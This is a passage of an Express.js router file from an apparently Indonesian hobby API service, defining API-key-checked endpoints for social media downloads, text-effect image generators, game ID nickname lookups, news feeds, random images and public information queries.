    if (listkey.includes(apikey)) {
        let iglu = await scr.instagramdl(url).catch(async _ => await scr.instagramdlv2(url)).catch(async _ => await scr.instagramdlv3(url)).catch(async _ => await scr.instagramdlv4(url))
        var result = iglu;
        res.json({
                result
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/download/pinterest', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.q
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter q"
    })
    if (listkey.includes(apikey)) {
        scr.pinterest(url)
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/download/ytmp3', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.url
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter URL"
    })
    if (listkey.includes(apikey)) {
        const {
            id,
            thumbnail,
            audio: _audio,
            title
        } = await scr.youtubedlv2(url)
        try {
            for (let i in _audio) {
                audio = _audio[i]
                let kin = await audio.download()
                res.json({
                    id: id,
                    thumbnail: thumbnail,
                    title: title,
                    size: audio.fileSize,
                    download: kin
                })
            }
        } catch {
            console.log(e);
            res.json(loghandler.error)
        }
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/download/ytmp4', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.url
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter URL"
    })
    if (listkey.includes(apikey)) {
        const {
            id,
            thumbnail,
            video: _video,
            title
        } = await scr.youtubedlv2(url)
        try {
            for (let i in _video) {
                video = _video[i]
                let kin = await video.download()
                res.json({
                    id: id,
                    thumbnail: thumbnail,
                    title: title,
                    size: video.fileSize,
                    download: kin
                })
            }
        } catch {
            console.log(e);
            res.json(loghandler.error)
        }
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Text Pro  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/maker/pencil', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/glitch', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/blackpink', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/berry', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-berry-text-effect-online-free-1033.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/neon', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/neon-light-text-effect-online-882.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/logobear', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/3dchristmas', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/3d-christmas-text-effect-by-name-1055.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/thunder', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/3dboxtext', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/glitch2', async (req, res, next) => {
    var apikey = req.query.apikey
    var textbesar = req.query.textbesar
    var textkecil = req.query.textkecil
    if (!textbesar) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text besar"
    })
    if (!textkecil) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text kecil"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [textbesar, textkecil])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/glitchtiktok', async (req, res, next) => {
    var apikey = req.query.apikey
    var textbesar = req.query.textbesar
    var textkecil = req.query.textkecil
    if (!textbesar) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text besar"
    })
    if (!textkecil) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text kecil"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [textbesar, textkecil])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/video-game-classic', async (req, res, next) => {
    var apikey = req.query.apikey
    var textbesar = req.query.textbesar
    var textkecil = req.query.textkecil
    if (!textbesar) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text besar"
    })
    if (!textkecil) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text kecil"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [textbesar, textkecil])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/marvel-studios', async (req, res, next) => {
    var apikey = req.query.apikey
    var textbesar = req.query.textbesar
    var textkecil = req.query.textkecil
    if (!textbesar) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text besar"
    })
    if (!textkecil) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text kecil"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-logo-style-marvel-studios-online-971.html", [textbesar, textkecil])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/ninja-logo', async (req, res, next) => {
    var apikey = req.query.apikey
    var textbesar = req.query.textbesar
    var textkecil = req.query.textkecil
    if (!textbesar) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text besar"
    })
    if (!textkecil) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text kecil"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-ninja-logo-online-935.html", [textbesar, textkecil])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/green-horror', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-green-horror-style-text-effect-online-1036.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/magma', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/3d-neon-light', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/3d-orange-juice', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/create-a-3d-orange-juice-text-effect-online-1084.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/chocolate-cake', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/chocolate-cake-text-effect-890.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/maker/strawberry', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter text"
    })
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        zero.textpro("https://textpro.me/strawberry-text-effect-online-889.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Cek ID Game  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/cekidgame/ff1', async (req, res, next) => {
    var apikey = req.query.apikey
    var uid = req.query.id
    if (!apikey) return res.json(loghandler.noapikey)
    if (!uid) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter id"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://api.gifan.id/trueID/freeFire/?id=${uid}`))
            .then(response => response.text())
            .then(data => {
                var nickname = data;
                res.json({
                    status: 'true',
                    author: 'ordiston',
                    result: {
                        nickname
                    }
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/cekidgame/ff2', async (req, res, next) => {
    var apikey = req.query.apikey
    var id = req.query.id
    if (!apikey) return res.json(loghandler.noapikey)
    if (!id) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter id"
    })
    if (listkey.includes(apikey)) {
        scr.nameFreeFire(id)
            .then(data => {
                var result = data;
                res.json({
                    status: 'true',
                    author: 'ordiston',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/cekidgame/ml', async (req, res, next) => {
    var apikey = req.query.apikey
    var uid = req.query.id
    if (!apikey) return res.json(loghandler.noapikey)
    if (!uid) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter id",
        format: "userID.zoneID"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://api.gifan.id/trueID/mobileLegends/?id=${uid}`))
            .then(response => response.text())
            .then(data => {
                var nickname = data;
                res.json({
                    status: 'true',
                    author: 'ordiston',
                    result: {
                        nickname
                    }
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/cekidgame/aov', async (req, res, next) => {
    var apikey = req.query.apikey
    var uid = req.query.id
    if (!apikey) return res.json(loghandler.noapikey)
    if (!uid) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter id"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://api.gifan.id/trueID/aov/?id=${uid}`))
            .then(response => response.text())
            .then(data => {
                var nickname = data;
                res.json({
                    status: 'true',
                    author: 'ordiston',
                    result: {
                        nickname
                    }
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/cekidgame/hd', async (req, res, next) => {
    var apikey = req.query.apikey
    var uid = req.query.id
    if (!apikey) return res.json(loghandler.noapikey)
    if (!uid) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter id"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://api.gifan.id/trueID/higgsDomino/?id=${uid}`))
            .then(response => response.text())
            .then(data => {
                var nickname = data;
                res.json({
                    status: 'true',
                    author: 'ordiston',
                    result: {
                        nickname
                    }
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/cekidgame/rgn-x', async (req, res, next) => {
    var apikey = req.query.apikey
    var uid = req.query.id
    if (!apikey) return res.json(loghandler.noapikey)
    if (!uid) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter id"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://api.gifan.id/trueID/ragnarok-x/?id=${uid}`))
            .then(response => response.text())
            .then(data => {
                var nickname = data;
                res.json({
                    status: 'true',
                    author: 'ordiston',
                    result: {
                        nickname
                    }
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  News  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/news/cnn', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.type
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://news-api-zhirrr.vercel.app/v1/cnn-news`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/news/cnbc', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.type
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://news-api-zhirrr.vercel.app/v1/cnbc-news`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/news/republika', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.type
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://news-api-zhirrr.vercel.app/v1/republika-news`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/news/tempo', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.type
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter type"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://news-api-zhirrr.vercel.app/v1/tempo-news/${url}`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    author: 'Ordiston',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/news/antara', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.type
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter type"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://news-api-zhirrr.vercel.app/v1/antara-news/${url}`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    author: 'Ordiston',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/news/kumparan', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.type
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://news-api-zhirrr.vercel.app/v1/kumparan-news`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    author: 'Ordiston',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Kata  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/kata/bucin', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const result = await scr.bucin()
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/kata/dare', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const result = await scr.dare()
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/kata/truth', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const result = await scr.truth()
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Gambar  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/gambar/cyberspace', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/gambar/cyberspace.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/gambar/game', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/gambar/game.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/gambar/islamic', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/gambar/islamic.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/gambar/mountain', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/gambar/mountain.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/gambar/programming', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/gambar/programming.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/gambar/technology', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/gambar/technology.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Photooxy  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/photooxy/flaming', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter text"
    })
    if (listkey.includes(apikey)) {
        oxy("https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
            .catch((err) => {
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/photooxy/shadow-sky', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter text"
    })
    if (listkey.includes(apikey)) {
        oxy("https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
            .catch((err) => {
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/photooxy/metallic', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter text"
    })
    if (listkey.includes(apikey)) {
        oxy("https://photooxy.com/other-design/create-metallic-text-glow-online-188.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
            .catch((err) => {
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/photooxy/naruto', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter text"
    })
    if (listkey.includes(apikey)) {
        oxy("https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html", [text])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
            .catch((err) => {
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/photooxy/pubg-mobile', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.text
    var text2 = req.query.text
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text || !text2) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter text & text2"
    })
    if (listkey.includes(apikey)) {
        oxy("https://photooxy.com/battlegrounds/make-wallpaper-battlegrounds-logo-text-146.html", [text, text2])
            .then((data) => {
                res.set({
                    'Content-Type': 'image/png'
                })
                res.send(data)
            })
            .catch((err) => {
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Information  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/information/github-stalk', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.username
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter username"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://api.github.com/users/${text}`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    author: 'ordiston',
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/information/jadwalsholat', async (req, res, next) => {
    var apikey = req.query.apikey
    var kota = req.query.kota
    if (!apikey) return res.json(loghandler.noapikey)
    if (!kota) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter kota"
    })
    if (listkey.includes(apikey)) {
        const result = await scr.jadwalsholat(kota)
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/information/jadwaltv', async (req, res, next) => {
    var apikey = req.query.apikey
    var channel = req.query.channel
    if (!apikey) return res.json(loghandler.noapikey)
    if (!channel) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter channel"
    })
    if (listkey.includes(apikey)) {
        const result = await scr.jadwalTV(channel)
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/information/kodepos', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.kota
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter kota"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://kodepos-api-zhirrr.vercel.app/?q=${text}`))
